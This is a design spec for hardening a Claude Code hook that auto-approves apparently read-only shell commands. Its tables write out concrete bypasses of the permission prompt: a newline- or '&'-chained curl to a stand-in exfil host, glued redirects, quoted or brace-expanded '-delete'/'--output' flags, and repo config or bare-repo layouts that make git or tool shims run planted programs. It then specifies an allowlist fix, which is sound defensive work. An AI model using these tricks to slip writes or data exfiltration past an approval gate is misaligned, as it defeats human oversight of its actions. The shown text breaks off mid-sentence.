# SPEC-340: permission-auto-approve stops silently approving writes

Status: VALIDATED
Lane: full
Type: bug-fix / behavioral
Board: -

## Problem

`hooks/permission-auto-approve.sh` auto-approves a Bash command it believes is read-only, so
Claude Code skips the normal permission prompt. The approval logic is denylist-shaped: it
rejects a short list of known-dangerous shell metacharacters, then approves anything whose
command TEXT matches a whitelist regex. A denylist only stops the danger someone already
thought of. Reading the hook found four ways a write slips through the regex, all reproduced
live by piping the hook's own PermissionRequest JSON shape to it on stdin (the hook never
executes the command, it only decides; no file was actually touched):

| # | Command | Why it slips through | Recorded output |
|---|---|---|---|
| 1 | `echo x >/tmp/f` | Line 41's chain/redirect guard is `>\s\|>>`, a `>` followed by whitespace or a doubled `>>`. A `>` glued directly to the target path (no space) matches neither, so the command reaches the `^echo\b` whitelist entry and is approved as if it only printed to stdout. | `{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}` |
| 2 | `find /tmp -name *.tmp -delete` | The whitelist entry is `^find\b.*-name\b`: it only checks that `-name` appears somewhere in the command, and imposes no constraint on any other token. `-delete` (or `-exec`, `-fprintf`, ...) can sit right next to `-name` and still match. | same `"allow"` shape |
| 3 | `git log --output=/tmp/paa-test-log` | The whitelist entry is `^git\s+(status\|log\|diff\|branch\|show\|remote\|tag)`: it anchors on the subcommand word only and never looks at the flags that follow. `log`, `diff`, and `show` all share git's diff-formatting machinery, which accepts `--output=<file>` and writes there. | same `"allow"` shape |
| 4 | `git status\ncurl -s http://example.invalid/exfil` | `grep -qE` (both the chain/redirect guard and the whitelist loop) matches per LINE, not per whole string, because `CMD` is fed to `grep` unquoted through a pipe that never disables its default line-oriented behavior. A newline is not in the guard's character class, so it is not rejected at line 41, and the first line alone (`git status`) satisfies the whitelist test even though a second, completely unrelated command rides along in the same `tool_input.command` string. | same `"allow"` shape |

The same read-and-probe pass found three more instances of the identical root cause (a
regex that checks presence, not exclusivity), listed here because the fix in ## Contract closes
all of them, not just the four the task named:

| Command | Why it slips through | Recorded output |
|---|---|---|
| `ls & curl http://example.invalid/exfil` | The chain guard's `\&\&` requires a DOUBLE ampersand; a single `&` (background execution) is not in the character class at all. | `"allow"` |
| `cat </etc/hosts` | The chain guard checks `>` (output redirect) but has no entry for `<` (input redirect / process substitution). Not a write by itself, but it is a redirection operator the guard's own header claims to block, and `<()` process substitution can smuggle a subshell through it. | `"allow"` |
| `git branch newbranch` / `git tag v9.9.9` / `git remote add evil <url>` | Same subcommand-only anchor as case 3. `git branch <name>` creates a branch, `git tag <name>` creates a tag, `git remote add` writes a new remote into `.git/config`; none of these are read operations, and none are excluded by a regex that only checks the subcommand word. | `"allow"` |

A validation pass on the first draft of ## Contract then found two more classes of the same
root cause, this time inside the proposed fix itself rather than the shipped hook:

| # | Command | Why it slips through the DRAFT contract |
|---|---|---|
| 5 | `find /tmp -name x "-delete"`, `find /tmp -name x \-delete`, `find /tmp -name x ${NOPE:--delete}`, `find /tmp -name x {-delete,}`, `find /tmp -name x $'\x2ddelete'`, `git log '--output=/tmp/x'`, `ruff check "--fix"` | The draft Stage B banned a fixed list of characters but still allowed `"`, `'`, `\`, `$`, and `{}`. Its Stage F only inspected tokens whose text starts with `-`, but quote removal, backslash escapes, parameter expansion, brace expansion, and ANSI-C quoting each rebuild a leading `-` at run time, after the scan has already passed the token. Every form above reaches the program as a live write flag. |
| 6 | `go env -w X=y`, `go list -toolexec=cmd`, `ruff check --fix-only`, `ruff check --add-noqa`, `ruff check --output-file=f`, `npx prettier --check --plugin=./x.js`, `file -C -m m` | The draft gave `go`, `ruff`, and `npx` a flag denylist or unrestricted trailing flags. `go env -w` writes persistent Go config, `-toolexec=` names a program to run, the three ruff flags all write, `--plugin=` loads arbitrary JS, and `file -C` compiles a `.mgc` file. `file` had been classified "no write-capable option", which is false. |
| 7 | `find . -name *`, `git log *`, `ruff check *` | A bare `*` in a gated tool's arguments glob-expands against the current directory. A checked-in file literally named `-delete`, `--fix`, or `--output` lands in flag position at run time, the one expansion a character allowlist still permits. |

Baseline (unchanged by the fix, confirmed live): `git status`, `git log --oneline -5`, and
`ls -la` all return the same `"allow"` shape today. These three anchor the must-still-approve
group in ## Test plan.

`tests/test-hooks.sh` (the `=== permission-auto-approve.sh ===` block and the cosmetic-module
block) tests the hook's SECURITY GATE (pipe/chain rejection) and its cosmetic never-blocks
contract, but has no case for any of the shapes above: none of them are chained, piped, or
malformed JSON, so the existing suite is silent on them by construction, not by having tried
and passed.

## Design

Diagram: see ## Picture (flowchart).

**Goal:** the hook approves a command only when it can positively confirm the command is a
single, simple, read-only invocation. Anything it cannot positively confirm returns no decision,
so Claude Code shows the normal permission prompt. The hook never denies; ## Contract keeps that
invariant (`tests/test-hooks.sh`'s existing cosmetic-module block already pins "no cosmetic hook
contains a block/deny emitter" by grepping the source, and this fix adds no deny branch).

**Allowlist over denylist, stated once, applies everywhere below.** A denylist has to name every
dangerous shape in advance; anything the author did not think of is approved by default until
someone notices. That is exactly the shape of every bug above: `>` without a following space, a
single `&`, `<`, a subcommand-only git check, a presence-only `find` check, a quote the scan
could not see, a per-tool flag the denylist did not enumerate. An allowlist inverts the default:
a command, flag, character, or shape that was never positively confirmed safe is excluded, not
included, so a write vector nobody has thought of yet still falls through to the normal prompt
instead of being silently approved. The inversion is applied at three levels: the character set
the command may contain (Stage B), the tools the hook will consider (Stages D and E), and the
flags each gated tool may carry (Stage F). The cost is real (fewer commands auto-approve, more
prompts show) and it is the correct trade for a hook whose entire job is deciding what to
approve WITHOUT asking a human.

**Threat model, stated once: writes and code execution.** This spec stops the hook from
silently approving commands that write files, mutate state, or run a second program. It does
NOT try to constrain what an approved READ returns: `cat`, `grep`, `stat`, and friends still
read whatever path they are pointed at, and the unconditional `WebFetch` approve means read
content can still leave the host. The named read-side gaps are listed under `Not covered` in
## After state; the `env`/`printenv` drop is a deliberate read-surface reduction recorded in
## Decision Log, not a secrecy guarantee.

**Config-loading tools are never auto-approved, stated once, applies everywhere below.** A tool
that can load checked-in or command-line config or plugins has an attack surface no flag list
converges on: every round of review on the draft surfaced another such flag (`prettier --config=`
executes JS, `ruff --config=fix=true` overrides config into a rewrite and a checked-in `fix = true`
does the same with no flag at all, `npm --logs-dir=`/`--cache=` write and `--registry=` sends
requests). Patching flags one by one does not converge, so the rule is categorical, not
per-flag: such a tool is never on the approved set. `npm`, `npx`, `ruff`, and `go` are dropped
entirely and fall through to the normal prompt (## Decision Log). A version-manager shim is the
same class: `node`, `python3`, and `cargo` resolve through mise, asdf, or rustup proxies that
read checked-in config (reproduced live: a `.tool-versions` line `node path:./ntc` made
`node --version` execute a planted binary; `rust-toolchain.toml`'s `path =` does the same for
the rustup proxy), so the `--version` trio leaves the approved set too. `git` is the named
exception: every config surface that can make it run code or write files (`core.pager`,
`pager.*`, aliases, filter drivers, `diff.external`, `core.hooksPath`) lives in `.git/config`
or `.git/hooks`, which git never tracks; the archive-carried `.git` case is recorded in
## Failure modes, and the clone-carried bare-layout case from the same row is closed by the
Stage E work-tree probe. Its flag allowlist stays (## Picture, Stage F). What remains in the
approved set is exactly what ## Picture shows: tools whose behaviour no repo file can change.

**Executing shell, stated once.** Commands approved here run under the harness's non-interactive
bash or zsh with default options: quote removal, backslash escapes, `$VAR`/`${..}` expansion,
brace expansion, ANSI-C quoting, command substitution, tilde expansion, globbing, and (zsh only)
`=word` path expansion. Stage B's character allowlist exists precisely so that after it passes,
the token stream the shell will build from `CMD` equals the `WORDS[]` the hook scanned. Three
expansions survive the allowlist and are handled on purpose: `~` (expands only to paths, never
to a `-`-token), `*` (handled per-tool at Stage F; see its rule), and zsh's `=word` (expands
`word` to its absolute path, e.g. `=ls` -> `/bin/ls`; it only ever yields a path, never a
`-`-token or a second command, so `=` stays in the allowlist). A runtime that executes Bash-tool
commands under a different shell grammar needs its own review of the character set; recorded in
## Failure modes.

### Rejected alternatives

| Approach | Why not |
|---|---|
| Patch the four known regexes in place (require whitespace before `>`, add `-delete` to a "bad flags" denylist for `find`, add `--output` to a denylist for `git log/diff/show`, treat `\n` as a chain operator) | Fixes exactly the four reported shapes and nothing else. The additional shapes found by reading the same code with the same lens (`&`, `<`, `git branch/tag/remote` mutation, quoting, per-tool flags) prove the class is bigger than the four named cases; patching case-by-case just continues the denylist's whack-a-mole pattern that created the bug in the first place. |
| Full shell grammar parser (proper tokenizer with quote-awareness, here-doc detection, brace expansion, glob resolution) | Correct in the limit but far past what "single, simple, read-only invocation" needs, and a bigger parser is a bigger place for the next false-approve to hide. `safety-gate.sh` already carries a heavier parser for a different, harder job (finding dangerous ops buried inside compound commands); this hook's job is narrower, it should refuse anything compound outright rather than understand it. |
| Keep the regex-whitelist shape but require every regex to end in `$` (anchor both ends) | Closes the git-subcommand-only and find-presence-only gaps for the SPECIFIC patterns rewritten, but a `$`-anchored regex still cannot express "no `-delete` token anywhere among these args" without turning into the same per-flag enumeration this spec ends up doing anyway. Anchoring is necessary but not sufficient, so the fix goes straight to explicit flag lists rather than a halfway regex patch that still needs a second pass. |
| Keep the character denylist but add the newly found smuggle characters to it (`"`, `'`, `\`, `$`, `{`, `}`) | The validation pass is the proof that this list never stays complete: it found five characters the first draft missed, and a sixth idea (history expansion `!`, `^` substitution, `[` globbing) would be next. The character set a command is allowed to contain is enumerable and small; the set of characters that can hurt is not. An allowlist is strictly easier to audit here. |
| Unquote/unescape tokens before the Stage F scan instead of banning the metacharacters | Re-implementing bash's expansion rules inside a bash hook is exactly the partial-parser shape rejected above, and every unhandled expansion reintroduces the same bug. Banning the characters is simpler and the failure mode is only an extra prompt. |
| Retire the Bash half and express the approved list as native `permissions.allow` rules in settings.json | `permissions.allow` is a Claude-Code-only surface; the hook form is the shape the kit can carry to other runtimes (the Codex adapter already ports the spine hooks via `hooks/codex-hooks.json` / `lib/codex/repin.sh`), and only the hook emits the per-stage `DWARVES_KIT_DEBUG` reason when a command falls through. Native rules also cannot express the staged checks (character allowlist, per-subcommand flag sets), so the equivalent rule list would be a coarser approximation with the same presence-check shape this fix removes. |
| **Chosen: single-line + character allowlist gate, then a first-word allowlist, then an explicit safe-flag allowlist for every tool that has a write-capable option** | Directly implements "positively confirm read-only." Each stage is independently simple to read and to test; a character absent from Stage B, a tool absent from the first-word lists, or a flag absent from its safe-flag list is excluded by construction rather than by someone remembering to add it to a denylist. |

## Picture

```
 stdin JSON {tool_name, tool_input.command}
        |
        v
 TOOL in {Read,Glob,Grep,WebSearch,WebFetch}? --yes--> allow        (unchanged)
        |no
        v
 TOOL == Bash and CMD non-empty?  --no--> no decision (fall through)
        |yes
        v
 NUL GUARD: raw decoded command contains     --yes--> no decision
          \u0000?  (jq -r emits a real NUL;
          bash $( ) drops it, so CMD would
          differ from the executed string)
        |no
        v
 STAGE A: CMD contains a newline?             --yes--> no decision   [case 4]
        |no                                    (subsumed by B; kept
        v                                       for readable failure)
 STAGE B: every char of CMD is in the ASCII allowlist
          [A-Za-z0-9 ./_=:,@%+*~-] ?           --no-->  no decision
        |yes                                   [cases 1-3, 5: quotes,
        v                                       \, $, {}, ;&|<>`()[]?,
 STAGE C: read -ra WORDS <<< "$CMD" (IFS split,   #!^ tab non-ASCII die]
          never glob-expands); WORDS[] empty
          (spaces-only CMD)?            --yes--> no decision
        |
        v
 GIT WORK-TREE PROBE (part of Stage E, runs before
          the Stage D git fast-path): if WORDS[0] == git,
          git -C <payload .cwd, else $PWD> rev-parse
          --is-inside-work-tree must print exactly
          "true" and exit 0?                --no-->  no decision
        |                                   [a clone can carry a tracked
        v                                    bare-repo layout whose config
                                             names programs git would run;
                                             covers EVERY git command]
 STAGE D: WORDS[0] on the "no write-capable option" list
          (ls, cat, head, tail, wc, echo, which, type,
           stat, du, df, grep)?
        |yes --------------------------------------------> allow
        |no
        v
 STAGE D: WORDS[0..1] in {git status, git ls-files}?
          (trailing flags unrestricted)
        |yes --------------------------------------------> allow
        |no
        v
 STAGE D: CMD exactly "pwd"?
        |yes --------------------------------------------> allow
        |no
        v
 STAGE E: WORDS[0] is a GATED tool (find, git, file)?
          (config-loading tools npm/npx/ruff/go and
           version-manager shims node/python3/cargo
           were dropped entirely; see ## Design)
        |no ---------------------------------------------> no decision
        |yes
        v
 STAGE F: for git, WORDS[1] is an allowed subcommand
          (find and file have no subcommand gate); no arg
          token contains "*" AND every token starting with
          "-" is in that tool's explicit safe-flag set?    [cases 2, 3,
        |no --------------------------------------------->    5, 6, 7]
        |    no decision
        |yes
        v
      allow
```

## Contract

Every check below runs in the order shown; the first failing check falls through to no decision
(the normal prompt). Nothing in this hook ever emits a deny/block decision (unchanged
invariant). The stale header comment at the top of the hook (the "SECURITY: Rejects any command
containing pipe operators" lines) is rewritten to describe this contract, one line per stage,
with Stage B named as a character allowlist. Every fall-through (the NUL guard and each stage)
emits one `DWARVES_KIT_DEBUG=1` stderr line naming the stage and the failed check (same
`[dwarves-kit:permission]` prefix as the existing debug lines), so an unexpected prompt is
diagnosable. Each line carries a stable grep-able token per fall-through point (`nul-guard`,
`stage-a`, `stage-b`, `stage-c`, `stage-e`, `stage-f`); AC6 pins them.

**Runtime, pinned: `/bin/bash` (3.2.x).** The hook's shebang and production invocation are
`/bin/bash`, so every idiom below must hold on bash 3.2: no associative arrays (each
safe-flag set is a `case` pattern list), no `mapfile`/`readarray`, and under `set -u` an
empty array makes `"${arr[@]}"` abort as unbound, so every `"${arr[@]}"` expansion is either
reached only after a `${#arr[@]}` length check or written `${arr[@]+"${arr[@]}"}`, and
`${#arr[@]}` itself is only read after the array is initialized (3.2 also raises unbound on
`${#unset[@]}`). `tests/test-hooks.sh`'s permission block invokes the hook via
`"${PAA_BASH:-/bin/bash}"`: `/bin/bash` is the default so the suite exercises the production
interpreter, and `PAA_BASH=$(command -v bash) bash tests/test-hooks.sh` re-runs the block
under the PATH bash to catch a dependency on either side.

**NUL guard, input fidelity.** `CMD` is produced by `$(jq -r ...)`: jq decodes a `\u0000`
escape to a real NUL byte, and bash command substitution drops NUL bytes silently, so a raw
command containing `\u0000` yields a `CMD` that differs from the string the runtime executes.
If the decoded `.tool_input.command` contains a NUL, the hook falls through before any stage
runs. Mechanism, pinned: `jq -e '(.tool_input.command // "") | explode | any(. == 0)'` on the
raw INPUT, a codepoint probe on the decoded value. `contains("\u0000")` is explicitly not the
mechanism: jq 1.6 truncates decoded strings at the first NUL byte, so `contains` can answer
false for a command that carries one; `explode | any(. == 0)` reads the codepoint list, which
is the shape that stays honest across jq versions. It is also not a text scan of the raw JSON
(a NUL can only arrive as the `\u0000` escape, since JSON forbids a raw control byte). Exit
semantics pinned: the probe runs under `jq -e` and the scan continues only when it exits
exactly 1 (decoded command is NUL-free); exit 0 (a NUL is present) and every other exit (a jq
error, e.g. unparseable INPUT or a non-string `command`) both fall through. Chosen over moving the
Stage B test into jq: the allowlist check stays in bash `[[ =~ ]]` per the mechanism pinned
below, the gate keeps one implementation language, and the probe is a single boolean. A
trailing newline needs no guard: `$(...)` strips it from the checked string, and stripped
trailing newlines can only ever remove empty trailing commands from the executed string, never
hide a live one.

**Stage A, single line.** `CMD` must not contain a newline (`$'\n'`). Redundant once Stage B
lands (a newline is not in the character allowlist) but kept as its own stage so a multi-line
command fails for the stated reason. Closes case 4.

**Stage B, character allowlist over the WHOLE string.** `CMD` must match
`^[A-Za-z0-9 ./_=:,@%+*~-]+$`: every character is an ASCII letter, digit, space, or one of
`./_=:,@%+*~-`. Everything else falls through: `"`, `'`, `\`, `` ` ``, `$`, `{`, `}`, `(`, `)`;
`&`, `|`, `<`, `>`, `?`, `[`, `]`, `#`, `!`, `^`, tab, and every non-ASCII byte. This replaces
the old character denylist. A denylist can only name the escapes somebody remembered, and the
validation pass found five characters the draft missed, each of which rebuilds a `-`-flag at
run time after Stage F has already scanned the token. With the allowlist, a literal `-` in the
command text is the only way a `-` reaches the program: no quote removal, backslash escape,
parameter expansion, brace expansion, ANSI-C quoting, or command substitution survives to run
time. The ASCII-only bound also kills lookalike characters (a Unicode minus in place of `-`)
for free. Closes cases 1 and 5 and the whole smuggle class.

Mechanism, pinned: the hook sets `LC_ALL=C` before the test and runs it as bash's
`[[ $CMD =~ ^[A-Za-z0-9 ./_=:,@%+*~-]+$ ]]` with the pattern in a variable (the safe idiom:
an unquoted literal on the RHS is the same thing, but the variable keeps `[[ =~ ]]`
portable across bash 3.2's parser), never as `echo "$CMD" | grep -E ...`. The class
carries NO backslash escapes: on the macOS regex engine a `\/` inside a bracket expression
is read as a literal backslash AND a slash, which would quietly allowlist the escape
character itself; every allowlisted char is written bare (`/` and space need no escape
inside brackets). `grep` applies locale-dependent range semantics (a non-C locale can
reorder or widen `A-Za-z`) and reads its input line-wise; both are wrong for a
whole-string, byte-exact check. `[[ =~ ]]` evaluates against the string as-is with no
line splitting, and `LC_ALL=C` makes the ranges pure ASCII.

**Stage C, tokenize.** Split `CMD` on whitespace into `WORDS[]`. Mechanism, pinned:
`read -ra WORDS <<< "$CMD"`: `read` applies the IFS split and never glob-expands, which
matters because Stage B lets `*` through; a `WORDS=($CMD)` split would glob unless `set -f`
ran first, and is not used. This split is exact, not
heuristic: Stage B already removed every quote and escape character, so no token can hide a
leading `-` behind `"`, `'`, or `\`, and none can expand into one at run time. Guard: a
spaces-only `CMD` passes the non-empty check and Stage B (spaces are allowlisted) but yields
an empty `WORDS[]`; the hook checks `WORDS` non-empty before any `WORDS[0]` read and falls
through, so `set -u` never trips on the unset element. Pinned by the spaces-only group-(a)
case in ## Test plan.

**Stage D, commands with no write-capable option (first word decides, no further check).**
Admission criterion, verified per tool against its man page or builtin doc: no flag writes to
the filesystem and none loads config or runs another program, so trailing flags are
unrestricted and a glob-expanded filename can only ever become a harmless flag. One citation
line per remaining tool:

| Command | Citation |
|---|---|
| `ls` | `ls(1)` (POSIX `ls` and macOS/BSD `ls`): options only shape stdout listing; none writes a file or execs. |
| `cat` | `cat(1)`: concatenates to stdout; the tool has no file-writing or exec option at all. |
| `head` | `head(1)`: prints leading lines to stdout; no write/exec option. |
| `tail` | `tail(1)`: prints trailing lines to stdout, `-f` only keeps reading; no write/exec option. |
| `wc` | `wc(1)`: counts to stdout; no write/exec option. |
| `echo` | `echo(1)` / bash builtin `help echo`: prints args to stdout; no write/exec option. |
| `which` | `which(1)` / zsh builtin: prints a command's path; no write/exec option. |
| `type` | bash builtin `help type`: describes how a name resolves; no write/exec option. |
| `stat` | `stat(1)` (BSD and GNU): reads inode metadata to stdout; no write/exec option. |
| `du` | `du(1)`: reports disk usage to stdout; no write/exec option. |
| `df` | `df(1)`: reports filesystem space to stdout; no write/exec option. |
| `grep` | `grep(1)`: no write/exec option; `GREP_OPTIONS` flag injection was removed in GNU grep 2.21 (2014), so the environment cannot smuggle flags either. |
| `pwd` | `pwd(1)` / bash builtin: exact match, zero further tokens. `env` lost its former zero-arg seat; see ## Decision Log. |
| `git status`, `git ls-files` | `git-status(1)` / `git-ls-files(1)`: exact two-word match at `WORDS[0..1]`; neither subcommand has a write-capable option, so trailing flags are unrestricted. The stat-cache index refresh `git status` may do is an internal bookkeeping write to `.git/`, not reachable file content. Every git config surface that could run code lives in `.git/config` (git never tracks it; the archive-carried `.git` case is in ## Failure modes, and the clone-carried bare-layout case is closed by the Stage E work-tree probe). |

`file` fails the criterion (`-C` writes a compiled magic file) and stays in the gated set.
`printenv` was dropped, see ## Decision Log. The `--version` trio (`node`, `python3`, `cargo`)
was dropped under the config-loading rule: on this stack all three resolve through
version-manager shims (mise, rustup) that honor checked-in `.tool-versions` /
`rust-toolchain.toml` entries; see ## Decision Log.

**Stage E/F, gated tools (explicit safe subcommand/flag allowlist required).** Two rules apply
to every gated tool's `WORDS[1:]` before the per-tool table below, and one gate applies to
`git` before any of its approve paths:

0. **Git work-tree probe.** No `git` command approves, including the Stage D
   `git status`/`git ls-files` fast-path, unless `git -C <cwd> rev-parse
   --is-inside-work-tree` prints exactly `true` and exits 0, where `<cwd>` is the
   payload's `.cwd` when present and the hook's `$PWD` otherwise. A `git clone`
   can materialize a bare-repo layout as ordinary tracked content (`HEAD`,
   `objects/`, `refs/`, `config`); git discovers such a directory as a bare
   repository and an approved `git log`/`git diff` then executes whatever the
   carried config names (`diff.external`, `gpg.program`, `core.fsmonitor`, a
   pager). `--is-inside-work-tree` prints `false` for a bare layout, including
   one nested inside a real repo's subdirectory (git tests the directory itself
   before walking up to the parent's `.git`), and exits nonzero outside any
   repo; every outcome but an exact `true` falls through. The probe is safe to
   run against a hostile layout: `rev-parse` is plumbing and reads config
   without executing any of it, verified live with `core.fsmonitor`,
   `core.pager`/`pager.rev-parse`, `diff.external`, filter drivers,
   `diff.<drv>.textconv`, and `gpg.program` all armed, zero of them ran
   (plumbing output is never paged, and `--is-inside-work-tree` touches neither
   the index nor a diff/filter path). The `.cwd` read uses the same fail-closed
   jq pattern as `TOOL`/`CMD`; a missing or unparseable `.cwd` degrades to
   `$PWD`, and a `.cwd` that is not a directory makes the probe exit nonzero,
   both of which fall through rather than approve. Runs once, ahead of the
   Stage D git arm in the code so every git approve is behind it. Closes the
   clone case in ## Failure modes.

1. A token containing `*` falls through. After Stage B, globbing is the only expansion that can
   still manufacture a `-`-token the scan never saw: an unquoted `*` expands against the current
   directory, where a checked-in file literally named `-delete`, `--fix`, or `--output` lands in
   flag position. Closes case 7. (Stage D tools keep `*`; their admission criterion makes a
   planted flag harmless.)
2. Every token starting with `-` must appear in the tool's safe-flag set, where a "safe flag"
   entry is a literal flag or a `name=` prefix as listed. Anything else falls through by
   omission, not by being named.

| Tool | Rule |
|---|---|
| `find` | Every `-`-prefixed token in `WORDS[1:]` must be one of: `-name`, `-iname`, `-path`, `-ipath`, `-type`, `-maxdepth`, `-mindepth`, `-print`, `-print0`. `-delete`, `-exec`, `-execdir`, `-ok`, `-okdir`, `-fprint`, `-fprintf`, `-fls`, and everything unlisted fall through. Non-flag tokens (search paths, literal patterns) are unrestricted. Closes case 2. |
| `git` `log`/`diff`/`show` | `WORDS[1]` in `{log, diff, show}`. Every `-`-prefixed token must be one of: `--oneline`, `--graph`, `--all`, `--stat`, `--name-only`, `--name-status`, `-p`, `--patch`, `--no-merges`, `--merges`, `--reverse`, `--cached`, `--staged`, `-n`, `--`, or match `^-[0-9]+$` (e.g. `-5`), or start with one of the prefixes `--format=`, `--pretty=`, `--since=`, `--until=`, `--author=`, `--grep=`, `--max-count=`; a `--format=`/`--pretty=` value containing `%G` is rejected, since the `%G` signature placeholders (`%GG`, `%G?`, ...) run `gpg.program` from repo config. `--output` and any other unlisted flag are excluded by omission. `git` global flags (`-c`, `-C`, `--exec-path`, `--git-dir`) are not on the list, so `git -c core.pager=x log` falls through. Closes case 3. |
| `git branch` | `WORDS[1] == "branch"`. Zero non-flag tokens allowed (no branch-name argument, which is what creates a branch). Any `-`-prefixed token must be one of `-v`, `-vv`, `-a`, `-r`, `--list`, `--show-current`. Closes the `git branch newbranch` case. |
| `git remote` | `WORDS[1] == "remote"`. Zero or one further token; if present it must be exactly `-v`, `--verbose`, or `show`. `add`/`remove`/`rename`/`set-url`/`set-branches`/`set-head`/`prune` are excluded by omission. |
| `git tag` | `WORDS[1] == "tag"`. Zero non-flag tokens allowed (no tag-name argument, which is what creates a tag). Any `-`-prefixed token must be one of `-l`, `--list`, or match `^-n[0-9]*$`. `-d`, `-a`, `-f`, `-s`, `-m` are excluded by omission. |
| `file` | Every `-`-prefixed token must be one of `-b`, `--brief`, `-i`, `-s`, `-L`, `-f`, `--mime`, `--mime-type`, `--mime-encoding`. `-C`/`--compile` (writes a compiled `.mgc` magic file), `-m`, and `-z` (decompresses by running external decompressor programs resolved via PATH) are excluded by omission. |

`npm`, `npx`, `ruff`, and `go` had per-tool rows here in the draft; they are gone entirely per
the config-loading rule in ## Design (dropped approvals, reason in ## Decision Log). They fall
through at Stage E, which no longer names them.

`sed` and `sort` are named in the task brief as tools whose base command has write-capable
options (`sed -i`, `sort -o`). Neither appears anywhere in the current hook, so there is no
existing bypass to fix; the "Sed/sort, explicitly rejected as new scope" table below states the
decision to leave them off the allowlist entirely rather than add them as new capability.
`tests/test-hooks.sh` gets one must-not-approve case each (`sed -i s/a/b/ file`, `sort -o
out.txt file`) proving they fall through purely because Stage D/E never names them, not because
of any sed/sort-specific logic, plus a source-level grep test (AC5) pinning that neither word
appears on a code line of the hook (comment lines skipped, so prose cannot trip it).

**Sed/sort, explicitly rejected as new scope:**

| Option | Why not |
|---|---|
| Add `sed`/`sort` to Stage D or E with flag-level filtering (`-i`/`-o` excluded, everything else allowed) | This is new auto-approval capability the current hook never had; the task is closing an existing over-approval, not growing the approved surface. Two more gated-tool flag tables cost real review surface for a benefit nobody asked for (YAGNI). If a future operator wants `sed`/`sort` auto-approved, that is a separate, explicitly-scoped follow-up, not a rider on a hardening fix. |
| **Chosen: leave `sed`/`sort` absent from every stage** | They already fall through to the normal prompt today (never matched any existing regex); this fix changes nothing about them, and a test pins that a write-capable form of each still falls through after the rewrite, so a future edit that accidentally adds a loose `^sed\b` or `^sort\b` entry is caught. |

## Task Breakdown

| Task | Files | Acceptance |
|---|---|---|
| T1 | `tests/test-hooks.sh` | Group (a)/(b) cases and the AC5 source grep land in the existing `=== permission-auto-approve.sh ===` block. Against the unpatched hook, every live-bypass case in group (a) goes red and every group (b) case stays green (the negative control table in ## Test plan). |
| T2 | `hooks/permission-auto-approve.sh` | Stage A-F rewrite per ## Contract, including the rewritten header comment. The full suite goes green. |
| T3 | `docs/FEATURES.md` | Regenerated via `bash lib/registry/feature-registry.sh generate`; the `permission-auto-approve.sh` row's Specs column picks up this spec. |

## Failure modes

| Class | Consequence | Why acceptable | Detection |
|---|---|---|---|
| A safe command uses a flag not yet on its tool's safe list (e.g. `git log --follow`) | Falls through to the normal prompt instead of auto-approving | The stated failure mode: never a false approve, only an extra prompt. The safe-flag lists can be extended later, named as a follow-up, without touching Stages A-C. | The prompt itself is the signal; `DWARVES_KIT_DEBUG=1` names `stage-f` as the refusing stage. |
| A safe command contains a banned character: a quote (`git log --format="%h %s"`, `find . -name '*.md'`), a backslash, a `$VAR`, a brace group, or any non-ASCII byte | Falls through to the normal prompt | These are exactly the smuggle characters: a quoted, escaped, or expanded `-flag` defeats any text-level leading-`-` check because bash restores the dash at run time. Banning them outright is what makes Stage F's "starts with `-`" test mean anything. The cost is an occasional prompt on a safe command. | The prompt itself; the `stage-b` debug line names the cause. |
| An unquoted `*` in a Stage-D command (`ls *.md`, `cat *`) glob-expands to a filename the scan never saw, potentially one literally named like a flag | The planted name lands as a flag to a Stage-D tool | Stage D's admission criterion is "no flag on this tool writes or execs", verified per tool, so a planted flag-looking filename is harmless there. For gated tools `*` is banned outright (Stage F rule 1), so the same trick cannot reach find/git/file. | None needed at run time: harmlessness follows from the per-tool admission check. The gated-tool side is pinned by group-(a) cases a32-a34. |
| Commands execute under the harness's non-interactive bash or zsh | Stage B's allowlist is derived from bash/zsh expansion rules | Recorded assumption: a runtime that executes Bash-tool commands under a different grammar (fish, PowerShell, cmd) needs its own review of the character set. The real Claude Code zsh shell snapshot is not default options: it enables `extendedglob`, `nocaseglob`, `autocd`, `cdablevars`, and `pathdirs`; probing the allowlist under that snapshot found no bypass (the extra glob characters extendedglob arms, `#`/`^`/`~`, only act on a pattern when globbing runs, and the only allowlisted glob char `*` is banned in gated-tool args; `nocaseglob` only changes match case; `autocd`/`cdablevars`/`pathdirs` act on command position or `cd`, and `cd` is never approved). Under zsh the only extra expansion the allowlist permits is `=word` at word start, which expands `word` to its absolute path (`=ls` -> `/bin/ls`); it only ever yields a path, never a `-`-token or a second command, so it is harmless. Out of scope beyond bash/zsh. | No hook-side detection. A wrong-grammar runtime surfaces as unexplained prompts (the fail-closed direction); an approval a grammar did not earn would only be caught by re-running the audit that produced this spec. |
| A checked-in tool config file steers an approved tool (`.prettierrc`, `.prettierrc.js`, `ruff.toml`, `pyproject.toml`, `.npmrc`, `.tool-versions`, `rust-toolchain.toml`, `.go-version`-adjacent env files) | An attacker-authored repo file turns a silently approved "read" into a write or code execution, the exact class this spec exists to close | Named as a trust assumption and removed, not patched: the config-loading rule in ## Design drops every such tool (`npm`, `npx`, `ruff`, `go`) and every version-manager shim (`node`, `python3`, `cargo`) from the approved set entirely rather than flag-gating it, because a checked-in config needs no flag at all to rewrite files (`ruff.toml` with `fix = true`), run code (`.prettierrc.js`), or redirect a shim to a planted binary (`.tool-versions` `path:`). The surviving tools have no checked-in config surface; `git`'s is recorded in the row below. | Silent false-approve until the tool is dropped; the drop is pinned by the group-(a) cases per dropped tool (a35-a39, a44-a48, a50-a52), so a regression that re-admits one goes red. |
| `git log`/`diff`/`show`/`branch`/`tag` honor the local `.git/config` (`core.pager`, `pager.*`, `core.fsmonitor`, `include.path`), and a checked-in `.gitattributes` can name a filter or textconv driver | A crafted local pager or fsmonitor config would run a program on an auto-approved read | "Never checked in" means git does not track `.git`; it does NOT mean a `.git/config` cannot arrive by other means. An attacker-supplied tarball/zip or a vendored bare repository can carry a live `.git/config` (e.g. `core.fsmonitor` pointing at a script), so `git status` inside an unpacked tree can run code. A normal `git clone` can deliver the same thing: a tracked directory can commit a bare-repo layout (`HEAD`, `config`, `objects/`, `refs/`) as ordinary tree content, so the clone materializes a live `config` setting `diff.external` or `gpg.program`, and a git command run inside that directory treats it as a bare repo and executes the configured program (reproduced live: `diff.external` aimed at a marker script ran on `git diff`). The clone/bare-layout case is now closed in the hook: before any git command approves, `git -C <payload .cwd, else $PWD> rev-parse --is-inside-work-tree` must print exactly `true` and exit 0 (see Stage E); a bare layout prints `false`, including one nested inside a real repo's subdirectory, because git tests the directory itself before walking up. Git's own mitigation, `safe.bareRepository=explicit` (a bare repo is recognized only when explicitly named via `GIT_DIR`/`--git-dir`), 